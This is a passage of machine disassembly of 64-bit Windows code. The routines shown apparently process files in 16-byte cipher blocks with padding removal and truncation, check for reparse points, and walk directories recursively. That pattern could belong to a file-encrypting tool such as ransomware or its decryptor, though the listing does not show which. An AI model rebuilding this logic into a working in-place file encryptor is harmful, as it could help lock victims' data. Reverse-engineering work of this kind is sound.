   140003938:	ff 15 f2 c6 02 00    	call   *0x2c6f2(%rip)        # 0x140030030
   14000393e:	44 8b f7             	mov    %edi,%r14d
   140003941:	45 85 ed             	test   %r13d,%r13d
   140003944:	0f 84 4a 01 00 00    	je     0x140003a94
   14000394a:	44 8b ff             	mov    %edi,%r15d
   14000394d:	0f 1f 00             	nopl   (%rax)
   140003950:	45 33 c9             	xor    %r9d,%r9d
   140003953:	45 33 c0             	xor    %r8d,%r8d
   140003956:	41 8b d7             	mov    %r15d,%edx
   140003959:	48 8b ce             	mov    %rsi,%rcx
   14000395c:	ff 15 ce c6 02 00    	call   *0x2c6ce(%rip)        # 0x140030030
   140003962:	89 7c 24 54          	mov    %edi,0x54(%rsp)
   140003966:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000396b:	4c 8d 4c 24 54       	lea    0x54(%rsp),%r9
   140003970:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140003976:	48 8b d5             	mov    %rbp,%rdx
   140003979:	48 8b ce             	mov    %rsi,%rcx
   14000397c:	ff 15 7e c6 02 00    	call   *0x2c67e(%rip)        # 0x140030000
   140003982:	85 c0                	test   %eax,%eax
   140003984:	0f 84 df 01 00 00    	je     0x140003b69
   14000398a:	49 8d 7c 24 30       	lea    0x30(%r12),%rdi
   14000398f:	48 8d 15 52 7b 03 00 	lea    0x37b52(%rip),%rdx        # 0x14003b4e8
   140003996:	49 8b 4c 24 28       	mov    0x28(%r12),%rcx
   14000399b:	ff 15 d7 c6 02 00    	call   *0x2c6d7(%rip)        # 0x140030078
   1400039a1:	33 c9                	xor    %ecx,%ecx
   1400039a3:	89 4c 24 58          	mov    %ecx,0x58(%rsp)
   1400039a7:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   1400039ab:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400039b0:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400039b5:	c7 44 24 38 10 00 00 	movl   $0x10,0x38(%rsp)
   1400039bc:	00 
   1400039bd:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   1400039c2:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   1400039c9:	00 
   1400039ca:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400039cf:	45 33 c9             	xor    %r9d,%r9d
   1400039d2:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   1400039d8:	48 8b d5             	mov    %rbp,%rdx
   1400039db:	49 8b 4c 24 10       	mov    0x10(%r12),%rcx
   1400039e0:	ff d0                	call   *%rax
   1400039e2:	85 c0                	test   %eax,%eax
   1400039e4:	0f 85 7f 01 00 00    	jne    0x140003b69
   1400039ea:	45 33 c9             	xor    %r9d,%r9d
   1400039ed:	45 33 c0             	xor    %r8d,%r8d
   1400039f0:	41 8b d7             	mov    %r15d,%edx
   1400039f3:	48 8b ce             	mov    %rsi,%rcx
   1400039f6:	ff 15 34 c6 02 00    	call   *0x2c634(%rip)        # 0x140030030
   1400039fc:	33 ff                	xor    %edi,%edi
   1400039fe:	89 7c 24 50          	mov    %edi,0x50(%rsp)
   140003a02:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   140003a06:	44 3b f0             	cmp    %eax,%r14d
   140003a09:	75 55                	jne    0x140003a60
   140003a0b:	85 db                	test   %ebx,%ebx
   140003a0d:	75 51                	jne    0x140003a60
   140003a0f:	0f b6 45 0f          	movzbl 0xf(%rbp),%eax
   140003a13:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140003a19:	44 2b c0             	sub    %eax,%r8d
   140003a1c:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003a21:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140003a26:	48 8b d5             	mov    %rbp,%rdx
   140003a29:	48 8b ce             	mov    %rsi,%rcx
   140003a2c:	ff 15 ee c5 02 00    	call   *0x2c5ee(%rip)        # 0x140030020
   140003a32:	85 c0                	test   %eax,%eax
   140003a34:	0f 84 2f 01 00 00    	je     0x140003b69
   140003a3a:	0f b6 45 0f          	movzbl 0xf(%rbp),%eax
   140003a3e:	f7 d8                	neg    %eax
   140003a40:	48 63 d0             	movslq %eax,%rdx
   140003a43:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140003a49:	45 33 c0             	xor    %r8d,%r8d
   140003a4c:	48 8b ce             	mov    %rsi,%rcx
   140003a4f:	ff 15 2b c6 02 00    	call   *0x2c62b(%rip)        # 0x140030080
   140003a55:	48 8b ce             	mov    %rsi,%rcx
   140003a58:	ff 15 da c5 02 00    	call   *0x2c5da(%rip)        # 0x140030038
   140003a5e:	eb 24                	jmp    0x140003a84
   140003a60:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003a65:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140003a6a:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140003a70:	48 8b d5             	mov    %rbp,%rdx
   140003a73:	48 8b ce             	mov    %rsi,%rcx
   140003a76:	ff 15 a4 c5 02 00    	call   *0x2c5a4(%rip)        # 0x140030020
   140003a7c:	85 c0                	test   %eax,%eax
   140003a7e:	0f 84 e5 00 00 00    	je     0x140003b69
   140003a84:	41 ff c6             	inc    %r14d
   140003a87:	41 83 c7 10          	add    $0x10,%r15d
   140003a8b:	45 3b f5             	cmp    %r13d,%r14d
   140003a8e:	0f 82 bc fe ff ff    	jb     0x140003950
   140003a94:	85 db                	test   %ebx,%ebx
   140003a96:	0f 84 d1 00 00 00    	je     0x140003b6d
   140003a9c:	41 c1 e5 04          	shl    $0x4,%r13d
   140003aa0:	45 33 c9             	xor    %r9d,%r9d
   140003aa3:	45 33 c0             	xor    %r8d,%r8d
   140003aa6:	41 8b d5             	mov    %r13d,%edx
   140003aa9:	48 8b ce             	mov    %rsi,%rcx
   140003aac:	ff 15 7e c5 02 00    	call   *0x2c57e(%rip)        # 0x140030030
   140003ab2:	89 7c 24 58          	mov    %edi,0x58(%rsp)
   140003ab6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003abb:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140003ac0:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140003ac6:	48 8b d5             	mov    %rbp,%rdx
   140003ac9:	48 8b ce             	mov    %rsi,%rcx
   140003acc:	ff 15 2e c5 02 00    	call   *0x2c52e(%rip)        # 0x140030000
   140003ad2:	85 c0                	test   %eax,%eax
   140003ad4:	0f 84 8f 00 00 00    	je     0x140003b69
   140003ada:	49 8d 5c 24 30       	lea    0x30(%r12),%rbx
   140003adf:	48 8d 15 02 7a 03 00 	lea    0x37a02(%rip),%rdx        # 0x14003b4e8
   140003ae6:	49 8b 4c 24 28       	mov    0x28(%r12),%rcx
   140003aeb:	ff 15 87 c5 02 00    	call   *0x2c587(%rip)        # 0x140030078
   140003af1:	89 7c 24 50          	mov    %edi,0x50(%rsp)
   140003af5:	89 7c 24 48          	mov    %edi,0x48(%rsp)
   140003af9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003afe:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140003b03:	c7 44 24 38 10 00 00 	movl   $0x10,0x38(%rsp)
   140003b0a:	00 
   140003b0b:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140003b10:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   140003b17:	00 
   140003b18:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003b1d:	45 33 c9             	xor    %r9d,%r9d
   140003b20:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140003b26:	48 8b d5             	mov    %rbp,%rdx
   140003b29:	49 8b 4c 24 10       	mov    0x10(%r12),%rcx
   140003b2e:	ff d0                	call   *%rax
   140003b30:	85 c0                	test   %eax,%eax
   140003b32:	75 35                	jne    0x140003b69
   140003b34:	45 33 c9             	xor    %r9d,%r9d
   140003b37:	45 33 c0             	xor    %r8d,%r8d
   140003b3a:	41 8b d5             	mov    %r13d,%edx
   140003b3d:	48 8b ce             	mov    %rsi,%rcx
   140003b40:	ff 15 ea c4 02 00    	call   *0x2c4ea(%rip)        # 0x140030030
   140003b46:	89 7c 24 54          	mov    %edi,0x54(%rsp)
   140003b4a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003b4f:	4c 8d 4c 24 54       	lea    0x54(%rsp),%r9
   140003b54:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   140003b59:	48 8b d5             	mov    %rbp,%rdx
   140003b5c:	48 8b ce             	mov    %rsi,%rcx
   140003b5f:	ff 15 bb c4 02 00    	call   *0x2c4bb(%rip)        # 0x140030020
   140003b65:	85 c0                	test   %eax,%eax
   140003b67:	75 04                	jne    0x140003b6d
   140003b69:	32 db                	xor    %bl,%bl
   140003b6b:	eb 02                	jmp    0x140003b6f
   140003b6d:	b3 01                	mov    $0x1,%bl
   140003b6f:	48 8b cd             	mov    %rbp,%rcx
   140003b72:	e8 a9 b2 00 00       	call   0x14000ee20
   140003b77:	0f b6 c3             	movzbl %bl,%eax
   140003b7a:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140003b7f:	48 33 cc             	xor    %rsp,%rcx
   140003b82:	e8 79 b2 00 00       	call   0x14000ee00
   140003b87:	48 8b 9c 24 d0 00 00 	mov    0xd0(%rsp),%rbx
   140003b8e:	00 
   140003b8f:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140003b96:	41 5f                	pop    %r15
   140003b98:	41 5e                	pop    %r14
   140003b9a:	41 5d                	pop    %r13
   140003b9c:	41 5c                	pop    %r12
   140003b9e:	5f                   	pop    %rdi
   140003b9f:	5e                   	pop    %rsi
   140003ba0:	5d                   	pop    %rbp
   140003ba1:	c3                   	ret
   140003ba2:	cc                   	int3
   140003ba3:	cc                   	int3
   140003ba4:	cc                   	int3
   140003ba5:	cc                   	int3
   140003ba6:	cc                   	int3
   140003ba7:	cc                   	int3
   140003ba8:	cc                   	int3
   140003ba9:	cc                   	int3
   140003baa:	cc                   	int3
   140003bab:	cc                   	int3
   140003bac:	cc                   	int3
   140003bad:	cc                   	int3
   140003bae:	cc                   	int3
   140003baf:	cc                   	int3
   140003bb0:	40 53                	rex push %rbx
   140003bb2:	b8 60 40 00 00       	mov    $0x4060,%eax
   140003bb7:	e8 a4 b8 00 00       	call   0x14000f460
   140003bbc:	48 2b e0             	sub    %rax,%rsp
   140003bbf:	48 8b 05 7a f4 03 00 	mov    0x3f47a(%rip),%rax        # 0x140043040
   140003bc6:	48 33 c4             	xor    %rsp,%rax
   140003bc9:	48 89 84 24 50 40 00 	mov    %rax,0x4050(%rsp)
   140003bd0:	00 
   140003bd1:	48 83 79 18 07       	cmpq   $0x7,0x18(%rcx)
   140003bd6:	48 8b d9             	mov    %rcx,%rbx
   140003bd9:	76 03                	jbe    0x140003bde
   140003bdb:	48 8b 09             	mov    (%rcx),%rcx
   140003bde:	ff 15 6c c4 02 00    	call   *0x2c46c(%rip)        # 0x140030050
   140003be4:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003be7:	0f 84 d3 00 00 00    	je     0x140003cc0
   140003bed:	0f ba e0 0a          	bt     $0xa,%eax
   140003bf1:	0f 83 c9 00 00 00    	jae    0x140003cc0
   140003bf7:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   140003bfc:	48 89 bc 24 78 40 00 	mov    %rdi,0x4078(%rsp)
   140003c03:	00 
   140003c04:	76 03                	jbe    0x140003c09
   140003c06:	48 8b 1b             	mov    (%rbx),%rbx
   140003c09:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003c10:	00 00 
   140003c12:	45 33 c9             	xor    %r9d,%r9d
   140003c15:	c7 44 24 28 00 00 20 	movl   $0x2200000,0x28(%rsp)
   140003c1c:	02 
   140003c1d:	33 d2                	xor    %edx,%edx
   140003c1f:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140003c25:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140003c2c:	00 
   140003c2d:	48 8b cb             	mov    %rbx,%rcx
   140003c30:	ff 15 12 c4 02 00    	call   *0x2c412(%rip)        # 0x140030048
   140003c36:	48 8b f8             	mov    %rax,%rdi
   140003c39:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003c3d:	74 7d                	je     0x140003cbc
   140003c3f:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140003c46:	00 00 
   140003c48:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140003c4d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003c52:	45 33 c9             	xor    %r9d,%r9d
   140003c55:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003c5a:	c7 44 24 28 00 40 00 	movl   $0x4000,0x28(%rsp)
   140003c61:	00 
   140003c62:	45 33 c0             	xor    %r8d,%r8d
   140003c65:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003c6a:	ba a8 00 09 00       	mov    $0x900a8,%edx
   140003c6f:	48 8b cf             	mov    %rdi,%rcx
   140003c72:	ff 15 b0 c3 02 00    	call   *0x2c3b0(%rip)        # 0x140030028
   140003c78:	48 8b cf             	mov    %rdi,%rcx
   140003c7b:	8b d8                	mov    %eax,%ebx
   140003c7d:	ff 15 e5 c3 02 00    	call   *0x2c3e5(%rip)        # 0x140030068
   140003c83:	85 db                	test   %ebx,%ebx
   140003c85:	74 35                	je     0x140003cbc
   140003c87:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140003c8b:	3d 0c 00 00 a0       	cmp    $0xa000000c,%eax
   140003c90:	74 2a                	je     0x140003cbc
   140003c92:	3d 03 00 00 a0       	cmp    $0xa0000003,%eax
   140003c97:	74 23                	je     0x140003cbc
   140003c99:	32 c0                	xor    %al,%al
   140003c9b:	48 8b bc 24 78 40 00 	mov    0x4078(%rsp),%rdi
   140003ca2:	00 
   140003ca3:	48 8b 8c 24 50 40 00 	mov    0x4050(%rsp),%rcx
   140003caa:	00 
   140003cab:	48 33 cc             	xor    %rsp,%rcx
   140003cae:	e8 4d b1 00 00       	call   0x14000ee00
   140003cb3:	48 81 c4 60 40 00 00 	add    $0x4060,%rsp
   140003cba:	5b                   	pop    %rbx
   140003cbb:	c3                   	ret
   140003cbc:	b0 01                	mov    $0x1,%al
   140003cbe:	eb db                	jmp    0x140003c9b
   140003cc0:	32 c0                	xor    %al,%al
   140003cc2:	eb df                	jmp    0x140003ca3
   140003cc4:	cc                   	int3
   140003cc5:	cc                   	int3
   140003cc6:	cc                   	int3
   140003cc7:	cc                   	int3
   140003cc8:	cc                   	int3
   140003cc9:	cc                   	int3
   140003cca:	cc                   	int3
   140003ccb:	cc                   	int3
   140003ccc:	cc                   	int3
   140003ccd:	cc                   	int3
   140003cce:	cc                   	int3
   140003ccf:	cc                   	int3
   140003cd0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003cd5:	55                   	push   %rbp
   140003cd6:	56                   	push   %rsi
   140003cd7:	57                   	push   %rdi
   140003cd8:	41 54                	push   %r12
   140003cda:	41 55                	push   %r13
   140003cdc:	41 56                	push   %r14
   140003cde:	41 57                	push   %r15
   140003ce0:	48 8d ac 24 b0 fd ff 	lea    -0x250(%rsp),%rbp
   140003ce7:	ff 
   140003ce8:	48 81 ec 50 03 00 00 	sub    $0x350,%rsp
   140003cef:	48 8b 05 4a f3 03 00 	mov    0x3f34a(%rip),%rax        # 0x140043040
   140003cf6:	48 33 c4             	xor    %rsp,%rax
   140003cf9:	48 89 85 40 02 00 00 	mov    %rax,0x240(%rbp)
   140003d00:	4c 8b f2             	mov    %rdx,%r14
   140003d03:	4c 8b f9             	mov    %rcx,%r15
   140003d06:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140003d0b:	45 33 ed             	xor    %r13d,%r13d
   140003d0e:	4c 8d 05 ef 79 03 00 	lea    0x379ef(%rip),%r8        # 0x14003b704
   140003d15:	48 8b d1             	mov    %rcx,%rdx
   140003d18:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003d1c:	e8 5f 3c 00 00       	call   0x140007980
   140003d21:	90                   	nop
   140003d22:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003d26:	48 83 7d e8 07       	cmpq   $0x7,-0x18(%rbp)
   140003d2b:	48 0f 47 4d d0       	cmova  -0x30(%rbp),%rcx
   140003d30:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140003d34:	ff 15 ce c2 02 00    	call   *0x2c2ce(%rip)        # 0x140030008
   140003d3a:	4c 8b e0             	mov    %rax,%r12
   140003d3d:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003d41:	0f 85 ca 00 00 00    	jne    0x140003e11
   140003d47:	48 8d 15 c2 79 03 00 	lea    0x379c2(%rip),%rdx        # 0x14003b710
   140003d4e:	48 8d 0d db 0c 04 00 	lea    0x40cdb(%rip),%rcx        # 0x140044a30
   140003d55:	e8 b6 3d 00 00       	call   0x140007b10
   140003d5a:	4d 8b 47 10          	mov    0x10(%r15),%r8
   140003d5e:	49 83 7f 18 07       	cmpq   $0x7,0x18(%r15)
   140003d63:	76 03                	jbe    0x140003d68
   140003d65:	4d 8b 3f             	mov    (%r15),%r15
   140003d68:	49 8b d7             	mov    %r15,%rdx
   140003d6b:	48 8b c8             	mov    %rax,%rcx
   140003d6e:	e8 fd 65 00 00       	call   0x14000a370
   140003d73:	48 8b c8             	mov    %rax,%rcx
   140003d76:	e8 55 40 00 00       	call   0x140007dd0
   140003d7b:	90                   	nop
   140003d7c:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003d80:	48 83 fa 07          	cmp    $0x7,%rdx
   140003d84:	76 36                	jbe    0x140003dbc
   140003d86:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003d8d:	00 
   140003d8e:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   140003d92:	48 8b c1             	mov    %rcx,%rax
   140003d95:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003d9c:	72 19                	jb     0x140003db7
   140003d9e:	48 83 c2 27          	add    $0x27,%rdx
   140003da2:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003da6:	48 2b c1             	sub    %rcx,%rax
   140003da9:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003dad:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003db1:	0f 87 de 03 00 00    	ja     0x140004195
   140003db7:	e8 64 b0 00 00       	call   0x14000ee20
   140003dbc:	66 0f 6f 05 dc 8a 03 	movdqa 0x38adc(%rip),%xmm0        # 0x14003c8a0
   140003dc3:	00 
   140003dc4:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   140003dc9:	66 44 89 6d d0       	mov    %r13w,-0x30(%rbp)
   140003dce:	49 8b 4e 38          	mov    0x38(%r14),%rcx
   140003dd2:	48 85 c9             	test   %rcx,%rcx
   140003dd5:	74 10                	je     0x140003de7
   140003dd7:	48 8b 01             	mov    (%rcx),%rax
   140003dda:	49 3b ce             	cmp    %r14,%rcx
   140003ddd:	0f 95 c2             	setne  %dl
   140003de0:	ff 50 20             	call   *0x20(%rax)
   140003de3:	4d 89 6e 38          	mov    %r13,0x38(%r14)
   140003de7:	48 8b 8d 40 02 00 00 	mov    0x240(%rbp),%rcx
   140003dee:	48 33 cc             	xor    %rsp,%rcx
   140003df1:	e8 0a b0 00 00       	call   0x14000ee00
   140003df6:	48 8b 9c 24 a0 03 00 	mov    0x3a0(%rsp),%rbx
   140003dfd:	00 
   140003dfe:	48 81 c4 50 03 00 00 	add    $0x350,%rsp
   140003e05:	41 5f                	pop    %r15
   140003e07:	41 5e                	pop    %r14
   140003e09:	41 5d                	pop    %r13
   140003e0b:	41 5c                	pop    %r12
   140003e0d:	5f                   	pop    %rdi
   140003e0e:	5e                   	pop    %rsi
   140003e0f:	5d                   	pop    %rbp
   140003e10:	c3                   	ret
   140003e11:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003e14:	0f 11 45 b0          	movups %xmm0,-0x50(%rbp)
   140003e18:	4c 89 6d c0          	mov    %r13,-0x40(%rbp)
   140003e1c:	4c 89 6d c8          	mov    %r13,-0x38(%rbp)
   140003e20:	48 8d 45 1c          	lea    0x1c(%rbp),%rax
   140003e24:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   140003e2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003e30:	49 ff c0             	inc    %r8
   140003e33:	66 42 83 3c 40 00    	cmpw   $0x0,(%rax,%r8,2)
   140003e39:	75 f5                	jne    0x140003e30
   140003e3b:	48 8d 55 1c          	lea    0x1c(%rbp),%rdx
   140003e3f:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140003e43:	e8 d8 4c 00 00       	call   0x140008b20
   140003e48:	90                   	nop
   140003e49:	4c 8d 45 b0          	lea    -0x50(%rbp),%r8
   140003e4d:	48 8b 5d b0          	mov    -0x50(%rbp),%rbx
   140003e51:	48 8b 7d c8          	mov    -0x38(%rbp),%rdi
   140003e55:	48 83 ff 07          	cmp    $0x7,%rdi
   140003e59:	4c 0f 47 c3          	cmova  %rbx,%r8
   140003e5d:	48 8b 75 c0          	mov    -0x40(%rbp),%rsi
   140003e61:	48 83 fe 01          	cmp    $0x1,%rsi
   140003e65:	75 2f                	jne    0x140003e96
   140003e67:	48 8b d6             	mov    %rsi,%rdx
   140003e6a:	48 8d 05 d7 78 03 00 	lea    0x378d7(%rip),%rax        # 0x14003b748
   140003e71:	48 8b c8             	mov    %rax,%rcx
   140003e74:	4c 2b c0             	sub    %rax,%r8
   140003e77:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003e7e:	00 00 
   140003e80:	42 0f b7 04 01       	movzwl (%rcx,%r8,1),%eax
   140003e85:	66 3b 01             	cmp    (%rcx),%ax
   140003e88:	75 0c                	jne    0x140003e96
   140003e8a:	48 83 c1 02          	add    $0x2,%rcx
   140003e8e:	48 83 ea 01          	sub    $0x1,%rdx
   140003e92:	75 ec                	jne    0x140003e80
   140003e94:	eb 3e                	jmp    0x140003ed4
   140003e96:	4c 8d 45 b0          	lea    -0x50(%rbp),%r8
   140003e9a:	48 83 ff 07          	cmp    $0x7,%rdi
   140003e9e:	4c 0f 47 c3          	cmova  %rbx,%r8
   140003ea2:	48 83 fe 02          	cmp    $0x2,%rsi
   140003ea6:	75 6b                	jne    0x140003f13
   140003ea8:	48 8b d6             	mov    %rsi,%rdx
   140003eab:	48 8d 0d 9a 78 03 00 	lea    0x3789a(%rip),%rcx        # 0x14003b74c
   140003eb2:	48 8b c1             	mov    %rcx,%rax
   140003eb5:	4c 2b c1             	sub    %rcx,%r8
   140003eb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003ebf:	00 
   140003ec0:	42 0f b7 0c 00       	movzwl (%rax,%r8,1),%ecx
   140003ec5:	66 3b 08             	cmp    (%rax),%cx
   140003ec8:	75 49                	jne    0x140003f13
   140003eca:	48 83 c0 02          	add    $0x2,%rax
   140003ece:	48 83 ea 01          	sub    $0x1,%rdx
   140003ed2:	75 ec                	jne    0x140003ec0
   140003ed4:	48 83 ff 07          	cmp    $0x7,%rdi
   140003ed8:	0f 86 4e 02 00 00    	jbe    0x14000412c
   140003ede:	48 8d 14 7d 02 00 00 	lea    0x2(,%rdi,2),%rdx
   140003ee5:	00 
   140003ee6:	48 8b c3             	mov    %rbx,%rax
   140003ee9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003ef0:	72 19                	jb     0x140003f0b
   140003ef2:	48 83 c2 27          	add    $0x27,%rdx
   140003ef6:	48 8b 5b f8          	mov    -0x8(%rbx),%rbx
   140003efa:	48 2b c3             	sub    %rbx,%rax
   140003efd:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003f01:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003f05:	0f 87 84 02 00 00    	ja     0x14000418f
   140003f0b:	48 8b cb             	mov    %rbx,%rcx
   140003f0e:	e9 14 02 00 00       	jmp    0x140004127
   140003f13:	4c 8d 05 3a 78 03 00 	lea    0x3783a(%rip),%r8        # 0x14003b754
   140003f1a:	49 8b d7             	mov    %r15,%rdx
   140003f1d:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140003f22:	e8 59 3a 00 00       	call   0x140007980
   140003f27:	90                   	nop
   140003f28:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   140003f2c:	48 83 ff 07          	cmp    $0x7,%rdi
   140003f30:	48 0f 47 d3          	cmova  %rbx,%rdx
   140003f34:	4c 8b c6             	mov    %rsi,%r8
   140003f37:	48 8b c8             	mov    %rax,%rcx
   140003f3a:	e8 61 63 00 00       	call   0x14000a2a0
   140003f3f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003f42:	0f 11 45 90          	movups %xmm0,-0x70(%rbp)
   140003f46:	4c 89 6d a0          	mov    %r13,-0x60(%rbp)
   140003f4a:	4c 89 6d a8          	mov    %r13,-0x58(%rbp)
   140003f4e:	0f 10 00             	movups (%rax),%xmm0
   140003f51:	0f 11 45 90          	movups %xmm0,-0x70(%rbp)
   140003f55:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140003f59:	0f 11 4d a0          	movups %xmm1,-0x60(%rbp)
   140003f5d:	4c 89 68 10          	mov    %r13,0x10(%rax)
   140003f61:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   140003f68:	00 
   140003f69:	66 44 89 28          	mov    %r13w,(%rax)
   140003f6d:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140003f72:	48 83 fa 07          	cmp    $0x7,%rdx
   140003f76:	76 37                	jbe    0x140003faf
   140003f78:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003f7f:	00 
   140003f80:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140003f85:	48 8b c1             	mov    %rcx,%rax
   140003f88:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003f8f:	72 19                	jb     0x140003faa
   140003f91:	48 83 c2 27          	add    $0x27,%rdx
   140003f95:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003f99:	48 2b c1             	sub    %rcx,%rax
   140003f9c:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003fa0:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003fa4:	0f 87 f7 01 00 00    	ja     0x1400041a1
   140003faa:	e8 71 ae 00 00       	call   0x14000ee20
   140003faf:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   140003fb4:	48 c7 44 24 40 07 00 	movq   $0x7,0x40(%rsp)
   140003fbb:	00 00 
   140003fbd:	66 44 89 6c 24 28    	mov    %r13w,0x28(%rsp)
   140003fc3:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140003fc7:	e8 e4 fb ff ff       	call   0x140003bb0
   140003fcc:	84 c0                	test   %al,%al
   140003fce:	74 11                	je     0x140003fe1
   140003fd0:	48 8d 15 81 77 03 00 	lea    0x37781(%rip),%rdx        # 0x14003b758
   140003fd7:	e8 84 3e 00 00       	call   0x140007e60
   140003fdc:	e9 be 00 00 00       	jmp    0x14000409f
   140003fe1:	f6 45 f0 10          	testb  $0x10,-0x10(%rbp)
   140003fe5:	74 38                	je     0x14000401f
   140003fe7:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003fec:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003ff1:	4c 89 6d 88          	mov    %r13,-0x78(%rbp)
   140003ff5:	49 8b 4e 38          	mov    0x38(%r14),%rcx
   140003ff9:	48 85 c9             	test   %rcx,%rcx
   140003ffc:	74 0e                	je     0x14000400c
   140003ffe:	48 8b 01             	mov    (%rcx),%rax
   140004001:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004006:	ff 10                	call   *(%rax)
   140004008:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   14000400c:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004011:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140004015:	e8 b6 fc ff ff       	call   0x140003cd0
   14000401a:	e9 80 00 00 00       	jmp    0x14000409f
   14000401f:	48 8d 55 90          	lea    -0x70(%rbp),%rdx
   140004023:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004028:	e8 33 19 00 00       	call   0x140005960
   14000402d:	48 8b d8             	mov    %rax,%rbx
   140004030:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004035:	49 8b 4e 38          	mov    0x38(%r14),%rcx
   140004039:	48 85 c9             	test   %rcx,%rcx
   14000403c:	0f 84 59 01 00 00    	je     0x14000419b
   140004042:	48 8b 11             	mov    (%rcx),%rdx
   140004045:	4c 8b 42 10          	mov    0x10(%rdx),%r8
   140004049:	48 8b d0             	mov    %rax,%rdx
   14000404c:	41 ff d0             	call   *%r8
   14000404f:	90                   	nop
   140004050:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140004054:	48 83 fa 07          	cmp    $0x7,%rdx
   140004058:	76 35                	jbe    0x14000408f
   14000405a:	48 8b 0b             	mov    (%rbx),%rcx
   14000405d:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004064:	00 
   140004065:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000406c:	72 1c                	jb     0x14000408a
   14000406e:	48 83 c2 27          	add    $0x27,%rdx
   140004072:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
